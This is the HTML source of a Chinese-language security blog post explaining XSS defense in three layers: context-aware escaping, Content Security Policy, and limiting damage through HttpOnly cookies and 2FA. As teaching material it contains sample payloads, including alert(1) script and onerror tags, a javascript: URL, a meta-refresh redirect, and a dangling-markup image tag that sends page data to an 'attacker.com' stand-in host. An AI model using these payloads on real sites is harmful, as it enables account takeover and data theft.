@@ -1,0 +1,592 @@
+<!DOCTYPE html>
+<html class="has-navbar-fixed-top" lang="zh-tw">
+<head>
+    <meta charset="utf-8">
+<title>淺談 XSS 攻擊與防禦的各個環節 - Huli&#39;s blog</title>
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+
+
+            
+<link href="https://blog.huli.tw/2021/06/19/en/xss-attack-and-defense/" rel="alternate" hreflang="en" />
+            
+    
+
+
+
+
+<link rel="canonical" href="https://blog.huli.tw/2021/06/19/xss-attack-and-defense/">
+
+
+
+
+
+    <meta name="description" content="前言談到 XSS（Cross-site scripting），許多人可能都只想到「就是網站上被攻擊者植入程式碼」，但若是仔細去想的話，會發現這之中其實還有很多環節都可以再深入探討。 而我所謂的這些「環節」，也可以理解成不同的「關卡」。 舉例來說，第一關當然就是盡可能防止自己的網站被 XSS 攻擊，不要讓攻擊者在網站中能夠植入程式碼。而「讓攻擊者在網站中植入程式碼」這件事，又可以往下再細分成不同地方">
+<meta property="og:type" content="article">
+<meta property="og:title" content="淺談 XSS 攻擊與防禦的各個環節">
+<meta property="og:url" content="https://blog.huli.tw/2021/06/19/xss-attack-and-defense/index.html">
+<meta property="og:site_name" content="Huli&#39;s blog">
+<meta property="og:description" content="前言談到 XSS（Cross-site scripting），許多人可能都只想到「就是網站上被攻擊者植入程式碼」，但若是仔細去想的話，會發現這之中其實還有很多環節都可以再深入探討。 而我所謂的這些「環節」，也可以理解成不同的「關卡」。 舉例來說，第一關當然就是盡可能防止自己的網站被 XSS 攻擊，不要讓攻擊者在網站中能夠植入程式碼。而「讓攻擊者在網站中植入程式碼」這件事，又可以往下再細分成不同地方">
+<meta property="og:locale" content="zh_TW">
+<meta property="og:image" content="https://blog.huli.tw/img/xss-defense/xss1.png">
+<meta property="og:image" content="https://blog.huli.tw/img/xss-defense/xss2.png">
+<meta property="og:image" content="https://blog.huli.tw/img/xss-defense/xss3.png">
+<meta property="article:published_time" content="2021-06-19T03:23:27.000Z">
+<meta property="article:modified_time" content="2023-05-07T01:15:16.493Z">
+<meta property="article:author" content="Huli">
+<meta property="article:tag" content="Front-end">
+<meta property="article:tag" content="Security">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://blog.huli.tw/img/xss-defense/xss1.png">
+
+
+
+<link rel="alternative" href="/atom.xml" title="淺談 XSS 攻擊與防禦的各個環節" type="application/atom+xml">
+
+
+
+<link rel="icon" href="/img/lidemy_logo.png">
+
+
+<link rel="stylesheet" href="//fonts.googleapis.com/css?family=Ovo|Source+Code+Pro">
+
+
+<link rel="stylesheet" href="/css/bulma.css?v=2.css">
+
+
+
+<link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/lightgallery/1.6.8/css/lightgallery.min.css">
+
+
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/themes/prism-tomorrow.min.css" />
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/prism/1.29.0/plugins/line-numbers/prism-line-numbers.min.css" />
+
+
+<link rel="stylesheet" href="/css/style.css?v=3.css">
+
+
+
+
+
+    
+    
+    
+    
+    
+    
+    
+    
+    
+    
+<script async src="https://www.googletagmanager.com/gtag/js?id=G-1393J2EVCZ"></script>
+<script>
+    window.dataLayer = window.dataLayer || [];
+    function gtag(){dataLayer.push(arguments);}
+    gtag('js', new Date());
+
+    gtag('config', 'G-1393J2EVCZ');
+</script>
+
+
+    
+
+
+<meta name="generator" content="Hexo 6.3.0"></head>
+<body>
+    <script>
+        if (localStorage.getItem('dark-mode')) {
+            if (localStorage.getItem('dark-mode') === 'true') {
+                document.body.classList.add('dark-mode')
+            }
+        } else {
+            if (window.matchMedia && window.matchMedia('(prefers-color-scheme: dark)').matches) {
+                document.body.classList.add('dark-mode')
+            }
+        }
+    </script>
+    
+<nav class="navbar is-transparent is-fixed-top navbar-main" role="navigation" aria-label="main navigation">
+    <div class="container">
+        <div class="navbar-brand">
+            <a class="navbar-item navbar-logo" href="/">
+                
+                    
+                    Huli&#39;s blog
+                    
+                
+            </a>
+            <div class="navbar-burger">
+                <span></span>
+                <span></span>
+                <span></span>
+            </div>
+        </div>
+        
+        <div class="navbar-menu navbar-start">
+            
+            <a class="navbar-item "
+               href="/archives">文章列表</a>
+            
+            <a class="navbar-item "
+               href="/categories">分類</a>
+            
+            <a class="navbar-item "
+               href="/recommend">推薦閱讀</a>
+            
+            <a class="navbar-item "
+               href="/about">關於我</a>
+            
+        </div>
+        
+        <div class="navbar-menu navbar-end">
+            
+            
+            <div class="navbar-item is-hoverable has-dropdown is-hidden-mobile is-hidden-tablet-only toc">
+                <a class="navbar-item" title="目錄">
+                    目錄
+                </a>
+                <div class="navbar-dropdown">
+                    
+                    
+                    
+                    
+                    <a class="navbar-item" href="#前言">1&nbsp;&nbsp;<b>前言</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#第一關阻止攻擊者在網站植入程式碼">2&nbsp;&nbsp;<b>第一關：阻止攻擊者在網站植入程式碼</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#第二關阻止惡意程式碼被執行">3&nbsp;&nbsp;<b>第二關：阻止惡意程式碼被執行</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#第三關降低-xss-攻擊之損害">4&nbsp;&nbsp;<b>第三關：降低 XSS 攻擊之損害</b></a>
+                    
+                    
+                    <hr class="navbar-divider">
+                    
+                    
+                    <a class="navbar-item" href="#總結">5&nbsp;&nbsp;<b>總結</b></a>
+                    
+                </div>
+            </div>
+            
+            
+            <a class="navbar-item" target="_blank" title="Medium" href="https://hulitw.medium.com/">
+                
+                <i class="fab fa-medium"></i>
+                
+            </a>
+               
+            <a class="navbar-item" target="_blank" title="Facebook" href="https://www.facebook.com/huli.blog">
+                
+                <i class="fab fa-facebook"></i>
+                
+            </a>
+               
+            <a class="navbar-item" target="_blank" title="RSS" href="/atom.xml">
+                
+                <i class="fas fa-rss"></i>
+                
+            </a>
+               
+            
+            <a class="navbar-item btn-dark-mode" title="dark-mode" href="#">
+                <div>
+                    <svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1" width="15" height="15" viewBox="0 0 256 256" xml:space="preserve">
+                    <defs>
+                    </defs>
+                    <g style="stroke: none; stroke-width: 0; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: none; fill-rule: nonzero; opacity: 1;" transform="translate(1.4065934065934016 1.4065934065934016) scale(2.81 2.81)" >
+                        <path d="M 87.823 60.7 c -0.463 -0.423 -1.142 -0.506 -1.695 -0.214 c -15.834 8.398 -35.266 2.812 -44.232 -12.718 c -8.966 -15.53 -4.09 -35.149 11.101 -44.665 c 0.531 -0.332 0.796 -0.963 0.661 -1.574 c -0.134 -0.612 -0.638 -1.074 -1.259 -1.153 c -9.843 -1.265 -19.59 0.692 -28.193 5.66 C 13.8 12.041 6.356 21.743 3.246 33.35 S 1.732 57.08 7.741 67.487 c 6.008 10.407 15.709 17.851 27.316 20.961 C 38.933 89.486 42.866 90 46.774 90 c 7.795 0 15.489 -2.044 22.42 -6.046 c 8.601 -4.966 15.171 -12.43 18.997 -21.586 C 88.433 61.79 88.285 61.123 87.823 60.7 z" style="stroke: none; stroke-width: 1; stroke-dasharray: none; stroke-linecap: butt; stroke-linejoin: miter; stroke-miterlimit: 10; fill: #ffa716; fill-rule: nonzero; opacity: 1;" transform=" matrix(1 0 0 1 0 0) " stroke-linecap="round" />
+                    </g>
+                    </svg>
+                </div>
+            </a>
+            
+                <a class="navbar-item" href="/2021/06/19/en/xss-attack-and-defense/">English</a>
+            
+            
+
+        </div>
+    </div>
+</nav>
+
+    <section class="section">
+    <div class="container">
+      
+      <div data-nosnippet class="self-notice">
+        最近開了一個讀者回饋表單，無論是對文章的感想或是對部落格的感想，有什麼想回饋的都可以填表單跟我說：<a href="https://forms.gle/XuWyRC5qtSd2ANta8" target="_blank">表單連結</a>
+      </div>
+      
+    <article class="article content gallery" itemscope itemprop="blogPost">
+    <h1 class="article-title is-size-3 is-size-4-mobile" itemprop="name">
+        
+            淺談 XSS 攻擊與防禦的各個環節
+        
+    </h1>
+    <div class="article-meta columns is-variable is-1 is-multiline is-mobile is-size-7-mobile">
+        <span class="column is-narrow">
+            <time datetime="2021-06-19T03:23:27.000Z" itemprop="datePublished">2021年6月19日</time>
+        </span>
+        
+        <span class="column is-narrow article-category">
+            <i class="far fa-folder"></i>
+            <a class="article-category-link" href="/categories/Security/">Security</a>
+        </span>
+        
+        
+        
+    </div>
+    
+    <div class="article-entry is-size-6-mobile" itemprop="articleBody">
+    
+        <h2><span id="前言">前言</span></h2><p>談到 XSS（Cross-site scripting），許多人可能都只想到「就是網站上被攻擊者植入程式碼」，但若是仔細去想的話，會發現這之中其實還有很多環節都可以再深入探討。</p>
+<p>而我所謂的這些「環節」，也可以理解成不同的「關卡」。</p>
+<p>舉例來說，第一關當然就是盡可能防止自己的網站被 XSS 攻擊，不要讓攻擊者在網站中能夠植入程式碼。而「讓攻擊者在網站中植入程式碼」這件事，又可以往下再細分成不同地方的植入，例如說 HTML 的植入，或者是 HTML 元素屬性中的植入，又或是 JavaScript 程式碼中的植入，這些都有著不同的攻擊以及防禦方式。</p>
+<p>而除了防止被植入程式碼以外，防守方應該還要進一步去想：「那如果真的不幸被植入程式碼了，可以怎麼辦？」</p>
+<p>這就是第二個關卡。雖然說第一關我們已經盡可能做好準備了，但難保不會有漏洞產生，因此守好第一關是不夠的，也要對第二關進行防守。</p>
+<p>假設今天攻擊者真的找到一個地方植入程式碼，那我們是不是可以想辦法阻止它執行？這就是 CSP（Content Security Policy）出場的時候了，藉由設定一些規則讓不合法的程式碼無法執行。例如說可以讓 inline 的 JavaScript 無法執行，那 <code>&lt;img src=x onerror=alert(1)&gt;</code> 就會變得無效。</p>
+<p>若是攻擊者真的很厲害，連 CSP 的規則都繞過了呢？這時就進入到第三關了，第三關的假設是攻擊者已經能夠在網站上執行任意程式碼。</p>
+<p>這時候還可以防守什麼呢？那就是試圖把損害控制到最低。</p>
+<p>以 Medium 這種部落格的平台來說，若是可以利用 XSS 把別人的帳號奪走（account takevoer），就是個嚴重的漏洞；或是因為 Medium 有付費牆的功能，因此若是能透過 XSS 把錢轉到攻擊者的帳號，也會是一個很嚴重的問題。</p>
+<p>而我們要在「網站已經被 XSS」的前提下，試圖去防禦這些攻擊。</p>
+<p>接著，就讓我們來看看不同的關卡有哪些不同的防禦方法。</p>
+<span id="more"></span>
+
+<h2><span id="第一關阻止攻擊者在網站植入程式碼">第一關：阻止攻擊者在網站植入程式碼</span></h2><p>要防止 XSS 的第一步，當然就是阻止攻擊者在網站上植入他們想要的東西，核心精神可以濃縮成一句：</p>
+<blockquote>
+<p>永遠不要相信使用者的輸入</p>
+</blockquote>
+<p>只要是有輸入的地方，都應該去做驗證。在輸出不被信任的資料時應該要做跳脫（escape）。</p>
+<p>舉例來說，今天有個地方可以讓使用者設定自己的暱稱，因為使用者可以自己輸入東西，所以在輸出這邊的資料時就要特別注意。</p>
+<p>如果在 render 時就是直接把使用者的輸入原封不動 render 出來，那若是使用者輸入的暱稱是：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，任何人瀏覽這一頁的時候就會看到畫面跳出一個 alert，因為暱稱輸入的東西被當作程式碼執行了。</p>
+<p>這種攻擊可以成立的主因就是使用者的輸入變成了程式碼的一部分，導致未預期的行為。</p>
+<p>要防止這種行為，就是在 render 的時候要做跳脫。例如說要先把 <code>&lt;</code> 轉成 <code>&amp;lt</code>，這樣在畫面上看到的依然是 <code>&lt;</code>，但是對 parser 來說那並不是標籤開始的符號，而是文字的 <code>&lt;</code>，就不會被當作 HTML 標籤來解析。</p>
+<p>如此一來，就能防止攻擊者植入程式碼。</p>
+<p>不過，這還只是對跳脫的粗淺理解而已，真正需要注意的是在不同的情境之下，可能會需要用不同的方式跳脫，就如同這兩篇講的一樣：</p>
+<ol>
+<li><a target="_blank" rel="noopener" href="https://www.ptt.cc/bbs/Soft_Job/M.1582437563.A.6F7.html">Re: [討論] 為什麼SQL注入和XSS漏洞會這麼氾濫?(1)</a></li>
+<li><a target="_blank" rel="noopener" href="https://www.ptt.cc/bbs/Soft_Job/M.1582441681.A.A7B.html">Re: [討論] 為什麼SQL注入和XSS漏洞會這麼氾濫?(2)</a></li>
+</ol>
+<p>假設你只有想到說要對標籤做跳脫，把 <code>&lt;&gt;</code> 這兩個符號都做了 escape，那確實沒有辦法直接插入標籤。可是，如果 render 暱稱的地方是這樣呢？</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&lt;?= avatar_url ?><span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>&lt;?= nickname ?><span class="token punctuation">"</span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span><span class="token prolog">&lt;?= nickname ?></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>除了在 div 裡面輸出暱稱之外，也會在 img 的 alt 標籤裡把暱稱 render 出來。這時候如果只跳脫了 <code>&lt;&gt;</code> 是不夠的，因為如果我讓 nickname 變成 <code>&quot; onload=&quot;alert(1)</code> 的話，結合起來就會變成：</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>avatar_url<span class="token punctuation">"</span></span> <span class="token attr-name">alt</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token punctuation">"</span></span> <span class="token special-attr"><span class="token attr-name">onload</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span><span class="token value javascript language-javascript"><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></span><span class="token punctuation">"</span></span></span> <span class="token punctuation">/></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>div</span><span class="token punctuation">></span></span>" onload="alert(1)<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p>攻擊者可以利用 <code>&quot;</code> 關閉前面的屬性，然後創出一個新的屬性 <code>onload</code>，達成 HTML 標籤屬性利用的 XSS。</p>
+<p>所以常見的特殊符號像是 <code>&quot;&#39;&lt;&gt;</code> 都要去做 escape，才能確保在不同地方時都有防禦效果。而這點其實許多程式語言或是 framework 都有做到了，例如說 PHP 的 htmlspecialchars：</p>
+<p><img src="/img/xss-defense/xss1.png"></p>
+<p>那這樣就打完收工了嗎？還沒。</p>
+<p>因為，在連結裡的內容又是另外一回事了，例如說：<code>&lt;a href=&quot;&lt;?= link ?&gt;&quot;&gt;my website&lt;/a&gt;</code></p>
+<p>有一種東西叫做 JavaScript pseudo-protocol，可以利用 <code>javascript:</code> 來執行 JS 程式碼，像是這樣：<code>&lt;a href=&quot;javascript:alert(1)&quot;&gt;my website&lt;/a&gt;</code>，在使用者點擊這個連結時，就會跳出 alert。</p>
+<p>而 <code>javascript:alert(1)</code> 這幾個字，完全沒有包含我們上面需要 escape 的特殊字元 <code>&quot;&#39;&lt;&gt;&amp;</code>，所以在這個狀況我們需要有不同的 escape 方法，或者是直接檢查內容，指定開頭必須要是 <code>http://</code> 或是 <code>http://</code> 之類的。</p>
+<p>這就是我剛剛講的，在不同地方，需要用不同的方式來進行跳脫及防禦。如果都是用同一種的話，有些地方就會失效。</p>
+<p>有些人看到這邊會想說：「阿～不用擔心啦！我用的前端框架都幫我做好了，預設都會 escape 啦！不會被 XSS」</p>
+<p>這個宣稱大部分是對的，現在確實很多前端的框架會處理這件事，但要特別注意我剛剛提的 href 的例子，因為 <code>javascript:alert(1)</code> 這幾個字元都不是特殊字元，所以跳脫完還是長一樣，依然會有這樣的漏洞。</p>
+<p>React 在 v16.9 的時候就針對這個 case 新增了警告：<a target="_blank" rel="noopener" href="https://reactjs.org/blog/2019/08/08/react-v16.9.0.html#deprecating-javascript-urls">Deprecating javascript: URLs</a>，並且在之後的 release 中會自動阻擋這個行為。不過根據測試的結果，目前的版本 v17.0.2 只會警告而已，還不會阻擋。</p>
+<p>這邊有一些相關的討論：<a target="_blank" rel="noopener" href="https://github.com/facebook/react/issues/16592">React@16.9 block javascript:void(0); #16592</a> 與 <a target="_blank" rel="noopener" href="https://github.com/facebook/react/issues/16382">False-positive security precaution warning (javascript: URLs) #16382</a>，想看程式碼的話在這邊：<a target="_blank" rel="noopener" href="https://github.com/facebook/react/blob/v17.0.2/packages/react-dom/src/shared/sanitizeURL.js">react&#x2F;packages&#x2F;react-dom&#x2F;src&#x2F;shared&#x2F;sanitizeURL.js </a>。</p>
+<p>除了看使用情境跳脫不是件容易的事情以外，意識到有哪些地方是使用者可以自己輸入的也沒有想像中簡單。</p>
+<p>因為除了資料庫或者是 API 是你的資料來源之外，URL 可能也是。有些程式碼會直接把網址列上的某個 query string 放到 JS 裡，之後直接把這個變數輸出到畫面上，這就是無意間信任了不該信任的資料。</p>
+<p>舉例來說，搜尋頁面的網址可能長這樣：<code>https://example.com/search?q=hello</code>，而在程式中是這樣寫的：</p>
+<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token keyword">const</span> q <span class="token operator">=</span> <span class="token string">'hello'</span> <span class="token comment">// 從網址列拿下來的參數</span>
+document<span class="token punctuation">.</span><span class="token function">querySelector</span><span class="token punctuation">(</span><span class="token string">'.search'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>innerHTML <span class="token operator">=</span> q<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+
+<p>這時如果你把 q 換成 HTML：<code>&lt;script&gt;alert(1)&lt;/script&gt;</code>，在沒做跳脫就輸出的狀況下，就會有 XSS 漏洞的產生。</p>
+<p>最後呢，有些網站會允許內容有部分的 HTML，最常見的就是部落格，因為部落格要有樣式嘛，除非是自訂資料格式，不然有些網站都直接把內文存成 HTML，然後用 <a target="_blank" rel="noopener" href="https://github.com/cure53/DOMPurify">DOMPurify</a> 或是 <a target="_blank" rel="noopener" href="https://github.com/leizongmin/js-xss">js-xss</a> 之類的套件去過濾，把不合法的標籤或是屬性過濾掉。</p>
+<p>雖然說使用這些 library 相對安全，但需要注意的是版本要時常更新，因為這類型的套件也可能會有漏洞的產生（<a target="_blank" rel="noopener" href="https://research.securitum.com/mutation-xss-via-mathml-mutation-dompurify-2-0-17-bypass/">Mutation XSS via namespace confusion – DOMPurify &lt; 2.0.17 bypass</a>）。另外也需要注意使用時的設定，設定錯誤的話也有可能造成問題，實際案例可以參考：<a target="_blank" rel="noopener" href="https://medium.com/cymetrics/prevent-xss-might-be-harder-than-you-thought-ce8c422540b">防止 XSS 可能比想像中困難</a>。</p>
+<p>總結一下，想要做好第一關的 XSS 防禦，需要注意的事情有：</p>
+<ol>
+<li>意識到哪邊是使用者可以自己輸入資料的地方</li>
+<li>針對不同情境去做 XSS 的防禦</li>
+</ol>
+<p>也可以考慮導入現成的 <a target="_blank" rel="noopener" href="https://www.cloudflare.com/zh-tw/learning/ddos/glossary/web-application-firewall-waf/">WAF</a>（Web Application Firewall），直接幫你把一些看起來很可疑的 payload 擋住。不過 WAF 也不是百分百有效，只是多一道防線而已。<br>或是也可以關心一下這個比較新的東西：<a target="_blank" rel="noopener" href="https://web.dev/trusted-types/">Trusted Types</a>。</p>
+<h2><span id="第二關阻止惡意程式碼被執行">第二關：阻止惡意程式碼被執行</span></h2><p>假設第一關被突破了，攻擊者可以在網站上插入任意程式碼，這時候要考慮的事情就是如何阻止程式碼被執行。</p>
+<p>這一關的重點是 CSP，Content Security Policy。</p>
+<p>CSP 是一系列的規則，用來跟瀏覽器講說哪些來源的資源可以被載入，哪些不行，可以利用 response header 或是 <code>&lt;meta&gt;</code> tag 來指定頁面的 CSP 規則。</p>
+<p>舉例來說，如果我很確定網站上的 JS 都來自於同一個 origin，那我的 CSP 就可以這樣寫：</p>
+<pre class="line-numbers language-none"><code class="language-none">Content-Security-Policy: default-src &#39;self&#39;; script-src &#39;self&#39;<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+
+<p><code>self</code> 代表的是 same origin 的意思。這樣寫的話，如果你試著載入不是當前 origin 的 JS，或者是直接在頁面上用 inline 的方式執行 script，都會看到瀏覽器報錯：</p>
+<p><img src="/img/xss-defense/xss2.png"></p>
+<p>CSP 可以制定許多不同資源的規則，需要更詳細的解釋可以看這邊：<a target="_blank" rel="noopener" href="https://content-security-policy.com/">Content Security Policy Reference</a>。想找到比較完整的 CSP，去看一些大公司的實作是最快的，接著我們直接來看一下 GitHub 的 CSP 長什麼樣子（為了方便閱讀，有重新排版過）：</p>
+<pre class="line-numbers language-none"><code class="language-none">default-src &#39;none&#39;
+
+base-uri &#39;self&#39;;
+
+block-all-mixed-content;
+
+connect-src &#39;self&#39; uploads.github.com www.githubstatus.com collector.githubapp.com
+api.github.com github-cloud.s3.amazonaws.com github-production-repository-file-5c1aeb.s3.amazonaws.com
+github-production-upload-manifest-file-7fdce7.s3.amazonaws.com github-production-user-asset-6210df.s3.amazonaws.com
+html-translator.herokuapp.com cdn.optimizely.com logx.optimizely.com&#x2F;v1&#x2F;events wss:&#x2F;&#x2F;alive.github.com
+*.actions.githubusercontent.com wss:&#x2F;&#x2F;*.actions.githubusercontent.com online.visualstudio.com&#x2F;api&#x2F;v1&#x2F;locations
+insights.github.com;
+
+font-src github.githubassets.com;
+
+form-action &#39;self&#39; github.com gist.github.com;
+
+frame-ancestors &#39;none&#39;;
+
+frame-src render.githubusercontent.com;
+
+img-src &#39;self&#39; data: github.githubassets.com identicons.github.com collector.githubapp.com github-cloud.s3.amazonaws.com
+secured-user-images.githubusercontent.com&#x2F; *.githubusercontent.com;
+
+manifest-src &#39;self&#39;;
+
+media-src github.com user-images.githubusercontent.com&#x2F;;
+
+script-src github.githubassets.com;
+
+style-src &#39;unsafe-inline&#39; github.githubassets.com;
+
+worker-src github.com&#x2F;socket-worker-3f088aa2.js gist.github.com&#x2F;socket-worker-3f088aa2.js<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>想要檢查 CSP 規則有沒有明顯漏洞的話，可以到 <a target="_blank" rel="noopener" href="https://csp-evaluator.withgoogle.com/">CSP Evaluator</a>，而 GitHub 的 CSP 設置得很嚴謹，幾乎每一種資源都有設定。</p>
+<p>這邊可以看到 script-src 的值只有 <code>github.githubassets.com</code>。因為沒有 <code>unsafe-inline</code> 的關係，所以 inline script 無法執行，而引入 script 的話也只能從 <code>github.githubassets.com</code> 這個來源引入，幾乎封死了執行 script 的路。</p>
+<p>而許多網站的 CSP 其實並不會設置得這麼嚴格，就有比較高的機率會被繞過，例如說 <a target="_blank" rel="noopener" href="https://blog.orange.tw/2019/03/a-wormable-xss-on-hackmd.html">A Wormable XSS on HackMD!</a> 直接用 cloudflare CDN 上的 AngularJS + CSTI 繞過；<a target="_blank" rel="noopener" href="https://github.com/k1tten/writeups/blob/master/bugbounty_writeup/HackMD_XSS_%26_Bypass_CSP.md">HackMD Stored XSS &amp; Bypass CSP with Google Tag Manager</a> 則是用 Google Tag Manager 來繞。</p>
+<p>另外，在某些情境之下就算乍看被封死，依然可以透過現有的 script 來幫你繞過，詳細資訊可以參考這個很經典的演講：<a target="_blank" rel="noopener" href="https://github.com/google/security-research-pocs/tree/master/script-gadgets">Breaking XSS mitigations via Script gadgets</a>。</p>
+<p>那如果真的沒辦法執行 script，還有什麼可以做的呢？</p>
+<p>就算只是插入 HTML，也還是可以做事的。</p>
+<p>例如說可以利用插入 HTML meta tag 來造成重新導向，把使用者導到惡意網站去，像這樣：<code>&lt;meta http-equiv=&quot;refresh&quot; content=&quot;0;https://example.com&quot;&gt;</code>。</p>
+<p>或者是插入 <code>&lt;img src=&quot;https://attacker.com?q=</code>（注意這邊 src 的雙引號只有開頭），讓整段 HTML 變成：</p>
+<pre class="line-numbers language-markup" data-language="markup"><code class="language-markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation attr-equals">=</span><span class="token punctuation">"</span>https://attacker.com?q=
+&lt;div>user info&lt;/div>
+&lt;div>sensitive data&lt;/div>
+&lt;div class=<span class="token punctuation">"</span></span><span class="token attr-name">test"</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>div</span><span class="token punctuation">></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+
+<p>藉由 src 沒有閉合的 <code>&quot;</code>，就可以拿到下一個 <code>&quot;</code> 為止的 HTML 內容，把這些當作 query string 的一部分傳到 server，而這中間可能就會有一些敏感資料的存在。所以 <code>img-src</code> 的 CSP 規則也是有用處的，可以防止這類型的攻擊。</p>
+<p>或也可以結合 <a href="https://blog.huli.tw/2021/01/23/dom-clobbering/">DOM Clobbering</a>，看看有沒有什麼地方可以攻擊。</p>
+<p>因此，就算不能執行 script，依然有其他攻擊手法可以用。</p>
+<p>GitHub 在 2017 年時有寫過一篇 <a target="_blank" rel="noopener" href="https://github.blog/2017-01-19-githubs-post-csp-journey/">GitHub’s post-CSP journey</a>，特別講了他們的 CSP 是怎麼設計的，是為了防範哪些已知的攻擊，寫得非常不錯。他們甚至還有一個 bug bounty 是 <a target="_blank" rel="noopener" href="https://bounty.github.com/targets/csp.html">GitHub CSP</a>，就算沒有找到 XSS 也沒有關係，只要提出能繞過 CSP 的手法就可以拿到獎金。</p>
+<h2><span id="第三關降低-xss-攻擊之損害">第三關：降低 XSS 攻擊之損害</span></h2><p>如果街亭跟前兩關都沒守住，XSS 勢在必行的話，接下來要思考的就是該如何降低 XSS 攻擊之損害。</p>
+<p>這邊我覺得有兩個面向可以去思考：</p>
+<ol>
+<li>避免攻擊者用受害者的身份登入</li>
+<li>避免攻擊者透過 XSS 進行比較重要的操作</li>
+</ol>
+<p>先來談第一種，有一種最常見的攻擊方式就是偷 cookie，把 document.cookie 偷走之後，若是使用者驗證身份的 token 在裡面，就可以直接用受害者的身份登入。因此這種驗證用的 cookie，請記得設定 <code>HttpOnly</code>，就能確保前端無法直接用 document.cookie 就取得 cookie。</p>
+<p>如果因為各種原因沒辦法保護使用者的 token，那就可以再設下其他關卡，例如說最常見的就是地點的檢查。假設一個使用者一直以來都在台灣，可是卻突然在烏克蘭發了一個 request，這時就可以先把這個操作擋住，並寄信告知使用者有可疑操作，麻煩他確認是否為本人。或也可以檢查使用者的瀏覽器是否一致，不一致的話一樣要先經過確認，加上另一道手續來保障使用者的安全。</p>
+<p>再來談第二種，就算 cookie 沒被偷走，因為攻擊者已經能執行任意程式碼了，所以直接打後端 API 還是做得到的，而且 cookie 會自動帶上。因此只要是使用者可以做的操作，攻擊者基本上都做得到。</p>
+<p>以部落格平台來說的話，發文、編輯文章或是刪文都是做得到的，攻擊者就只要直接利用 XSS 去打 API 就行了。</p>
+<p>這時候對於一些比較重要的操作，就應該設置第二道關卡，例如說更改密碼需要輸入原密碼，那這樣因為攻擊者不知道原密碼是什麼，打 API 也沒有用。或者是要轉帳的時候需要用手機接收驗證碼，沒有手機的話就無法執行操作。</p>
+<p><img src="/img/xss-defense/xss3.png"></p>
+<p>其實說白話一點就是 2FA（Two-factor authentication）啦。對於這些重要操作，除了登入之外還要設下第二種可以確認是本人的機制，這樣就算被打出 XSS，攻擊者也無法執行這些操作，可以讓損害降低。</p>
+<h2><span id="總結">總結</span></h2><p>資安的世界既廣又深，這篇提到的都只是大方向的概觀而已。若是再深入下去，每個環節都可以再變成多個獨立的主題，而且也可以結合其他的攻擊，例如說：</p>
+<ol>
+<li>自訂的 XSS 過濾規則有沒有可能有漏洞，會被繞過？有的話又該怎麼繞？</li>
+<li>儘管都過濾了，會不會其實 server side 的漏洞可以幫忙繞過？例如說 double encoding</li>
+<li>CSP 設得夠嚴謹嗎？有沒有現成的繞過方式？</li>
+<li>2FA 機制有實作完整嗎？rate limit 有設好嗎？沒有設的話是不是暴力破解就被爆破了？</li>
+<li>忘記密碼的機制有實作正確嗎？會不會可以用別人的身份幫忙重設密碼？</li>
+</ol>
+<p>XSS 並不是全有或是全無這麼簡單，有的網站雖然被 XSS，但影響範圍有限，而有的網站一被 XSS，連使用者的帳號密碼都可以輕易更改，直接把帳號給搶過來。</p>
+<p>在防禦 XSS 的時候，如果只防禦了第一關，只有想到「我要把 render 的內容 escape」就容易造成上面所講的狀況，要嘛就是整個網站都很安全連 XSS 都沒有，要嘛就是一被打出 XSS，整個網站就被打穿。</p>
